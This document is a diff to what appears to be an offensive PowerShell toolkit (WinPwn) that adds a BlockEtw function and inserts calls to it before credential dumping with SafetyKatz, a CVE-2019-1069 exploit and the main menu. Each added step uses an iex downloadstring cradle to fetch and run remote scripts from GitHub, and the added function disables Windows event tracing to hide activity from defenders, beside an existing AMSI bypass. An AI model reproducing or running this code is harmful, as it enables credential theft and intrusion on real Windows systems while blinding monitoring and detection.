@@ -110,6 +110,7 @@ function sharpcradle{
         $noninteractive
     )
     pathcheck
+    BlockEtw
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if ($allthosedotnet)
     {
@@ -507,6 +508,7 @@ function safedump
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
+    blocketw
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
 }
@@ -770,6 +772,7 @@ function CVE-2019-1129
 
 function CVE-2019-1069
 {
+	blocketw
         iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     	$polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
 	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
@@ -2733,6 +2736,12 @@ function mimiload
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/loadmimi.ps1')
 	loadmimi
 }
+
+function BlockEtw
+{
+	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-BlockETW.ps1')
+	Invoke-BlockETW
+}
     
 function WinPwn
 {
@@ -2794,6 +2803,7 @@ __        ___       ____
 '@
     dependencychecks
     AmsiBypass
+    BlockEtw
     if ($noninteractive)
     {
         if ($Domainrecon)
